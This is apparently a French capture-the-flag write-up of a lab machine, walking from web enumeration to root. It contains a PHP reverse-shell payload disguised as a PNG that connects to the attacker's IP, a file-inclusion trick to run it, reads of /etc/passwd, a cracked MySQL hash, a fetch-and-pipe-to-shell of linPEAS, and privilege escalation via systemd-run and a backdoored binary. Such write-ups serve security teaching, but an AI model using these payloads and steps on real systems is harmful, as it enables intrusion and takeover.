192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET / HTTP/1.1" 200 11081 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Une requête fait la différence : 

```bash
192.168.204.133 - - [22/Mar/2021:22:56:00 +0300] "GET /0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/ HTTP/1.1" 200 444 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Et si on accède à ce lien : [http://192.168.17.129/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/](http://192.168.1.43/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af45ecf0-16cf-41d1-8f93-610eba88c88e/2021-03-24-15-48-27.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/af45ecf0-16cf-41d1-8f93-610eba88c88e/2021-03-24-15-48-27.png)

Pouf ! Une nouvelle page.

Un petit coup de **Gobuster** nous en dira surement plus !

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 100 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi,jsp,bak -s 200,204,301,302,307 -u http://192.168.17.129/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.17.129/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/
[+] Threads:        100
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,aspx,json,php,sh,html,bak,py,rb,jsp,pl,asp,cfm,cgi
[+] Timeout:        10s
===============================================================
2021/03/28 21:02:04 Starting gobuster
===============================================================
/index.html (Status: 200)
/language.php (Status: 200)
/uploads (Status: 301)
/upload.php (Status: 200)
/upload.html (Status: 200)
===============================================================
2021/03/28 21:02:36 Finished
===============================================================
```

Quelques pages méritent notre attention, regardons-ça de plus près.

# 2. Exploitation

## 2.1. Uploader un fichier ?

La présence d'un fichier `upload.php` ainsi qu'un dossier du même nom me laisse à penser qu'on pourrait upload un fichier.

- **upload.php**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7fa4b9c-f5b5-4b13-94c0-abb083b226f8/2021-03-24-16-31-55.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7fa4b9c-f5b5-4b13-94c0-abb083b226f8/2021-03-24-16-31-55.png)

Bien vu Sherlock, reste maintenant à upload un *"D4rk V1rUs"* pour compromettre la fille de Zeus.

Partons du principe qu'on ne pourra pas mettre n'importe quelle extension à son fichier car il y aura surement des vérifications. On va créer un reverse shell en php qu'on enregistrera en `.png`

- **payload.png**

```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.17.130/6666 0>&1'");
#La requête tcp sera envoyée à 192.168.17.130 (IP de la Kali) sur le port 6666 (parce qu'on est D4rk) et créera un reverse shell qu'on controlera de notre PC
?>
```

Le résultat :

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/73bcd3ca-32df-4296-ad13-f64771845f54/2021-03-24-23-42-11.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/73bcd3ca-32df-4296-ad13-f64771845f54/2021-03-24-23-42-11.png)

Trop fort.

Maintenant il faut pouvoir l'éxécuter.

- **language.php**

```html
<!DOCTYPE html>
<html>
<head>
	<title>Language</title>
</head>
<body>
<input type="submit" value="language" 
    onclick="window.location='language.php?lang=en.php';" />  
</form>
</body>
</html>
```

Quand on regarde le code HTML de ce fichier, on peut voir que lorsque l'on clique sur le magnifique bouton `language`, on est redirigé sur `language.php?lang=en.php` .

Le paramètre attendu étant un fichier `.php`, il est fort probable qu'on puisse lui donner un autre fichier comme notre `payload.png` créé plus tôt.

Testons !

[http://192.168.17.129/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/language.php?lang=uploads/payload.png](http://192.168.17.129/0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/language.php?lang=uploads/payload.png)

Il faut juste préparer l'écoute du shell sur la Kali, puis recharger la page

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ nc -lvnp 6666                                                                  
listening on [any] 6666 ...
connect to [192.168.17.130] from (UNKNOWN) [192.168.17.129] 49448
bash: cannot set terminal process group (602): Inappropriate ioctl for device
bash: no job control in this shell
<493bc83f0fb56adda28125498762f28f1cc40c320300125ce$
```

Moi je dis : BINGO !

Un petit cat du fichier `/etc/passwd` nous informe qu'il y a 2 utilisateurs :

```bash
<493bc83f0fb56adda28125498762f28f1cc40c320300125ce$ cat /etc/passwd
cat /etc/passwd
...
eguillemot:x:1000:1000:Erwan Guillemot,,,:/home/eguillemot:/bin/bash
khennou:x:1001:1001:Kamal Hennou,,,:/home/khennou:/bin/bash
```

- eguillement
- khennou

## 2.2. Le flag user

### 2.2.1. La chance

De mon expérience, les mots de passe sont toujours les plus simple, sur un malentendu, `esgi` fonctionnerait pour eguillemot :

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ ssh eguillemot@192.168.17.129 -p 25452
eguillemot@192.168.17.129's password: esgi
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

110 packages can be updated.
10 updates are security updates.

New release '20.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Mar 24 23:34:21 2021 from 192.168.17.130
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

eguillemot@artemis:~$
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c7aa8862-33eb-44d7-81ec-26a35c7068d5/giphy_(1).gif](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c7aa8862-33eb-44d7-81ec-26a35c7068d5/giphy_(1).gif)

Je devrais faire détective, j'ai trop de potentiel.

### 2.2.2. La vrai solution

C'était un coup de chance, mais cherchons une autre méthode plus "conventionnel" de trouver son mot de passe.

En se promenant dans les fichiers, on découvre un dossier `backups-4e45a234079C45bc326b12ce453/new-website` et c'est là que ça devient intéressant.

```bash
<493bc83f0fb56adda28125498762f28f1cc40c320300125ce$  cd ..
 cd ..
www-data@artemis:/var/www/html$ ls -a
ls -a
.
..
0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce
backups-4e45a234079C45bc326b12ce453
index.html
www-data@artemis:/var/www/html$ cd backups-4e45a234079C45bc326b12ce453
cd backups-4e45a234079C45bc326b12ce453
www-data@artemis:/var/www/html/backups-4e45a234079C45bc326b12ce453$ ls -la
ls -la
total 16
drwxr-xr-x 3 root root 4096 Mar 23 01:46 .
drwxr-xr-x 4 root root 4096 Mar 22 22:50 ..
drwxr-xr-x 5 root root 4096 Mar 23 02:17 new-website
-r--r----- 1 root root  744 Mar 23 03:13 sudoers
www-data@artemis:/var/www/html/backups-4e45a234079C45bc326b12ce453$ cd new-website
<backups-4e45a234079C45bc326b12ce453$ cd new-website                
<l/backups-4e45a234079C45bc326b12ce453/new-website$ ls -la
ls -la
total 200
drwxr-xr-x  5 root root  4096 Mar 23 02:17 .
drwxr-xr-x  3 root root  4096 Mar 23 01:46 ..
-rw-r--r--  1 root root   405 Mar 23 01:46 index.php
-rw-r--r--  1 root root  3189 Mar 23 02:17 users.sql
-rw-r--r--  1 root root  7165 Mar 23 01:46 wp-activate.php
drwxr-xr-x  9 root root  4096 Mar 23 02:03 wp-admin
-rw-r--r--  1 root root   351 Mar 23 01:46 wp-blog-header.php
-rw-r--r--  1 root root  2328 Mar 23 01:46 wp-comments-post.php
-rw-r--r--  1 root root  2913 Mar 23 01:46 wp-config-sample.php
-rw-r--r--  1 root root  2881 Mar 23 02:09 wp-config.php
drwxr-xr-x  4 root root  4096 Mar 23 01:46 wp-content
-rw-r--r--  1 root root  3939 Mar 23 01:46 wp-cron.php
drwxr-xr-x 25 root root 12288 Mar 23 01:46 wp-includes
-rw-r--r--  1 root root  2496 Mar 23 01:46 wp-links-opml.php
-rw-r--r--  1 root root  3649 Mar 23 01:46 wp-load.php
-rw-r--r--  1 root root 45339 Mar 23 01:46 wp-login.php
-rw-r--r--  1 root root  8509 Mar 23 01:46 wp-mail.php
-rw-r--r--  1 root root 21125 Mar 23 01:46 wp-settings.php
-rw-r--r--  1 root root 31328 Mar 23 01:46 wp-signup.php
-rw-r--r--  1 root root  4747 Mar 23 01:46 wp-trackback.php
-rw-r--r--  1 root root  3236 Mar 23 01:46 xmlrpc.php
```

Un fichier `users.sql`, ça promet.

- **users.sql**

```sql
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` (`Host`, `User`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `ssl_cipher`, `x509_issuer`, `x509_subject`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`, `password_expired`, `password_last_changed`, `password_lifetime`, `account_locked`) VALUES ('%','eguillemot','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','','','','',0,0,0,0,'mysql_native_password','*B38E48ED65DF090D475F5F25E030D183BC140ECD','N','2018-04-15 22:00:00',NULL,'N');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `db` WRITE;
/*!40000 ALTER TABLE `db` DISABLE KEYS */;
INSERT INTO `db` (`Host`, `Db`, `User`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Execute_priv`, `Event_priv`, `Trigger_priv`) VALUES ('localhost','performance_schema','mysql.session','Y','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N');
INSERT INTO `db` (`Host`, `Db`, `User`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Execute_priv`, `Event_priv`, `Trigger_priv`) VALUES ('localhost','sys','mysql.sys','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','Y');
/*!40000 ALTER TABLE `db` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```

Et là, faut lire entre les lignes. Mais pour résumer parce que je suis gentille :

- un user `eguillemot` est ajouté
    - authentification_string : `*B38E48ED65DF090D475F5F25E030D183BC140ECD`
    - plugin : `mysql_native_password`

En se renseignant, le plugin utilisé encode en md5 le mot de passe. Et il est vieux, donc facilement cassable. Une petite recherche internet sur [https://crackstation.net/](https://crackstation.net/) (merci Mathis) et on voit bien que le mot de passe est `esgi`.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/547f5a9d-c2db-4513-be3c-a91c81c135ca/2021-03-25-14-51-04.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/547f5a9d-c2db-4513-be3c-a91c81c135ca/2021-03-25-14-51-04.png)

### 2.2.3. Le flag user

Une fois connecté en SSH avec eguillemot, il suffit simplement de lister ses fichiers pour rapidement trouver le flag.

```bash
eguillemot@artemis:~$ ls
Desktop    Downloads         Music     Public     user.txt
Documents  examples.desktop  Pictures  Templates  Videos
eguillemot@artemis:~$ cat user.txt 
CEH{Wh4t_4_w0nd3rfUl_w3bs1t3}
```

> Flag user : `CEH{Wh4t_4_w0nd3rfUl_w3bs1t3}`

# 2.3. Le flag root

### 2.3.1. LinPEAS mon amour

LinPEAS est l'acronyme de **Linux Privilege Escalation Awesome Script** et oui, il est **AWESOME**

Petit parcours pour savoir comment s'en servir :

1. L'installer tu devras

```bash
eguillemot@artemis:~$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
--2021-03-25 12:11:50--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 326636 (319K) [text/plain]
Saving to: ‘linpeas.sh.1’

linpeas.sh.1                 100%[==============================================>] 318.98K  --.-KB/s    in 0.02s   

2021-03-25 12:11:50 (18.1 MB/s) - ‘linpeas.sh.1’ saved [326636/326636]
```

      2. Lui donner les droit tu devras (bah oui, sinon tu peux pas l'exécuter...)

```bash
eguillemot@artemis:~$ chmod +x linpeas.sh
```

      3. Les miracles tu obtiendras

Il est important de préciser que pour des raisons de facilité, j'ai capturé uniquement ce qui nous intéresse parce que mon dieu ce qu'il est long le résultat !

```bash
eguillemot@artemis:~$ ./linpeas.sh -a > linpeas.txt
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/726c65c7-fd0a-4ed6-8eb4-4093e13a5d8f/2021-03-25-17-43-35.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/726c65c7-fd0a-4ed6-8eb4-4093e13a5d8f/2021-03-25-17-43-35.png)

La légende est ici très importante, c'est ce qui nous évitera de lire l'entièreté du fichier. Par conséquent, on s'attardera uniquement au lignes correspondant au **`RED/YELLOW`**

Une première ligne attire l'attention :

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cb409609-3e0a-4858-ace8-f77a17c4cac2/2021-03-25-17-45-59.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cb409609-3e0a-4858-ace8-f77a17c4cac2/2021-03-25-17-45-59.png)

Il y aurait une "vulnérabilité" sur le ***sudo*** ?

Pour plus d'informations, il faut se rendre sur le petit lien orange [https://book.hacktricks.xyz/linux-unix/privilege-escalation#users](https://book.hacktricks.xyz/linux-unix/privilege-escalation#users) qui contient un paragraphe intéressant que voici :

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c170f7ba-3c16-45da-ab8f-8c46de4e2e2d/2021-03-25-17-46-58.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c170f7ba-3c16-45da-ab8f-8c46de4e2e2d/2021-03-25-17-46-58.png)

Sur un malentendu ça marche, testons !

```bash
eguillemot@artemis:~$ systemd-run -t /bin/bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.                                                
Authenticating as: Erwan Guillemot,,, (eguillemot)
Password: esgi
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u726.service                                                                                   
Press ^] three times within 1s to disconnect TTY.
root@artemis:/#
```

TADA. 

[http://gph.is/2AmePHo](http://gph.is/2AmePHo)

Mais encore une fois c'était pas la bonne méthode...

Si on reprends le fichier `linpeas.txt`, il y a une autre ligne qui pourrait nous être utile

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/227fab6c-8c7b-4eb7-83d1-535cb22d0802/2021-03-25-23-25-27.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/227fab6c-8c7b-4eb7-83d1-535cb22d0802/2021-03-25-23-25-27.png)

Une VRAI vulnérabilité sur le `whois`.

Et ce fichier est possédé par khennou.

Si on le lançait ?

```bash
eguillemot@artemis:~$ /usr/bin/whois 
//petit commentaire pour créciser qu'il ne se passe actuellement rien
eguillemot@artemis:~$
```

Bon, on dirait que ça attends une chaine mais quant à savoir laquelle...

Copions-le sur notre machine afin de pouvoir le bidouiller plus facilement

```bash
eguillemot@artemis:~$ scp /usr/bin/whois loullouw@192.168.17.130:/home/loullouw/whois-null
loullouw@192.168.17.130's password: 
whois                                                                             100%   16KB   3.3MB/s   00:00
```

### 2.3.2. Ghidra, mon talon d'Achille

Une fois copié sur ma machine, je l'ai ouvert sur Ghidra, un logiciel de reverse engineering.

Dans la section Symbol Tree, il m'a suffit de regarder la fonction main

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1f281d41-9757-4c26-bea5-45a3310e5c5a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1f281d41-9757-4c26-bea5-45a3310e5c5a/Untitled.png)

Celle ci contenait le code C suivant : 

```c
undefined8 main(void)

{
  __uid_t __euid;
  __uid_t __ruid;
  undefined8 local_34;
  undefined4 local_2c;
  char local_28 [12];
  int local_1c;
  
  local_34 = 0x5e415d415d415d5b;
  local_2c = 0x415f41;
  fgets(local_28,0xc,stdin);
  local_1c = strcmp(local_28,(char *)&local_34);
  if (local_1c == 0) {
    __euid = geteuid();
    __ruid = geteuid();
    setreuid(__ruid,__euid);
    system("/bin/bash");
  }
  return 0;
}
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f713a49c-e498-4ab5-a4fc-f374033ea523/giphy_(2).gif](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f713a49c-e498-4ab5-a4fc-f374033ea523/giphy_(2).gif)

Oui, c'est une simple fonction de comparaison de chaîne qui permet de lancer un shell root. Ce qui explique que le programme ne semblait rien faire. Il attendait la bonne chaine en entrée.

### 2.3.3. GDB, pas de mot pour te décrire

Lançons maintenant gdb, un fabuleux debugger.

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ gdb whois-null      
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.                                                                   
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from whois-null...
(No debugging symbols found in whois-null)
```

Créons un premier breakpoint sur la fonction `main`

```bash
(gdb) b main
Breakpoint 1 at 0x1179
(gdb) run
Starting program: /home/loullouw/whois-null 

Breakpoint 1, 0x0000555555555179 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x0000555555555175 <+0>:     push   %rbp
   0x0000555555555176 <+1>:     mov    %rsp,%rbp
=> 0x0000555555555179 <+4>:     push   %rbx
   0x000055555555517a <+5>:     sub    $0x28,%rsp
   0x000055555555517e <+9>:     movabs $0x5e415d415d415d5b,%rax
   0x0000555555555188 <+19>:    mov    %rax,-0x2c(%rbp)
   0x000055555555518c <+23>:    movl   $0x415f41,-0x24(%rbp)
   0x0000555555555193 <+30>:    mov    0x2eb6(%rip),%rdx        # 0x555555558050 <stdin@GLIBC_2.2.5>
   0x000055555555519a <+37>:    lea    -0x20(%rbp),%rax
   0x000055555555519e <+41>:    mov    $0xc,%esi
   0x00005555555551a3 <+46>:    mov    %rax,%rdi
   0x00005555555551a6 <+49>:    call   0x555555555050 <fgets@plt>
   0x00005555555551ab <+54>:    lea    -0x2c(%rbp),%rdx
   0x00005555555551af <+58>:    lea    -0x20(%rbp),%rax
   0x00005555555551b3 <+62>:    mov    %rdx,%rsi
   0x00005555555551b6 <+65>:    mov    %rax,%rdi
   0x00005555555551b9 <+68>:    call   0x555555555060 <strcmp@plt>
   0x00005555555551be <+73>:    mov    %eax,-0x14(%rbp)
   0x00005555555551c1 <+76>:    cmpl   $0x0,-0x14(%rbp)
   0x00005555555551c5 <+80>:    jne    0x5555555551fc <main+135>
   0x00005555555551c7 <+82>:    mov    $0x0,%eax
   0x00005555555551cc <+87>:    call   0x555555555040 <geteuid@plt>
   0x00005555555551d1 <+92>:    mov    %eax,%ebx
   0x00005555555551d3 <+94>:    mov    $0x0,%eax
   0x00005555555551d8 <+99>:    call   0x555555555040 <geteuid@plt>
   0x00005555555551dd <+104>:   mov    %ebx,%esi
   0x00005555555551df <+106>:   mov    %eax,%edi
   0x00005555555551e1 <+108>:   mov    $0x0,%eax
   0x00005555555551e6 <+113>:   call   0x555555555070 <setreuid@plt>
   0x00005555555551eb <+118>:   lea    0xe12(%rip),%rdi        # 0x555555556004
   0x00005555555551f2 <+125>:   mov    $0x0,%eax
   0x00005555555551f7 <+130>:   call   0x555555555030 <system@plt>
   0x00005555555551fc <+135>:   mov    $0x0,%eax
   0x0000555555555201 <+140>:   mov    -0x8(%rbp),%rbx
   0x0000555555555205 <+144>:   leave  
   0x0000555555555206 <+145>:   ret    
End of assembler dump.
(gdb) b *0x00005555555551b9
Breakpoint 2 at 0x5555555551b9
(gdb) c
Continuing.
```

Puis un deuxième au moment du lancement de la fonction `strcmp` et on affiche le registre

```bash
Breakpoint 2, 0x00005555555551b9 in main ()
(gdb) info reg
rax            0x7fffffffdfd0      140737488347088
rbx            0x0                 0
rcx            0x7ffff7edde8e      140737352949390
rdx            0x7fffffffdfc4      140737488347076
rsi            0x7fffffffdfc4      140737488347076
rdi            0x7fffffffdfd0      140737488347088
rbp            0x7fffffffdff0      0x7fffffffdff0
rsp            0x7fffffffdfc0      0x7fffffffdfc0
r8             0x7fffffffdfd0      140737488347088
r9             0x7ffff7fadbe0      140737353800672
r10            0x6e                110
r11            0x246               582
r12            0x555555555090      93824992235664
r13            0x0                 0
r14            0x0                 0
r15            0x0                 0
rip            0x5555555551b9      0x5555555551b9 <main+68>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) print (char *) $rsi
$1 = 0x7fffffffdfc4 "[]A]A]A^A_A"
```

ça à l'air simple dit comme ça, mais j'ai print tous les registres à la main pour trouver lequel contenait la valeur qui m'intéressait.

Mais j'ai fini par trouver ! C'était `rsi`, c'est toujours de la faute de rsi de toute façon.

Il suffit plus que de tester la chaine `[]A]A]A^A_A` . C'est sur, celle là je ne l'aurais pas sortie de mon chapeau.

### 2.2.4. Le flag root

```bash
eguillemot@artemis:~$ /usr/bin/whois 
[]A]A]A^A_A
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Il manquait bien encore un peu de difficulté ! Mais en lançant whois, eguillemot s'est transformé en khennou, comme on peut le voir ci-dessous.

J'ai listé les fichiers de **khennou** et voici ce qui en est ressorti :

```bash
khennou@artemis:~$ cd /home/khennou
khennou@artemis:/home/khennou$ ls -la
total 32
drwxr-xr-x 2 khennou khennou    4096 Mar 23 03:21 .
drwxr-xr-x 4 root    root       4096 Mar 23 01:32 ..
lrwxrwxrwx 1 root    root          9 Mar 23 03:21 .bash_history -> /dev/null
-rw-r--r-- 1 khennou khennou     220 Mar 23 01:32 .bash_logout
-rw-r--r-- 1 khennou khennou    3771 Mar 23 01:32 .bashrc
-rw-r--r-- 1 khennou khennou    8980 Mar 23 01:32 examples.desktop
-rw-r--r-- 1 khennou khennou     807 Mar 23 01:32 .profile
-rw-r--r-- 1 khennou eguillemot    0 Mar 23 03:12 .sudo_as_admin_successful
```

Apparement, lui pourrait lancer les fichiers en tant que **sudo**. 

Testons, on est plus à ça près.

```bash
khennou@artemis:~$ sudo -l
Matching Defaults entries for khennou on artemis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User khennou may run the following commands on artemis:
    (ALL : ALL) NOPASSWD: ALL
khennou@artemis:~$
```

Et il ne demande pas de mot de passe en plus ! Si c'est pas trop bien ça

```bash
khennou@artemis:~$ sudo su
root@artemis:~# cat root.txt 
CEH{B4ckd0or3d_3SG1????}
root@artemis:~#
```

> Flag root : `CEH{B4ckd0or3d_3SG1????}`

Et voilà. C'est FINI.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0233908d-4eab-4dfc-8087-b51de98673e3/giphy_(3).gif](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0233908d-4eab-4dfc-8087-b51de98673e3/giphy_(3).gif)
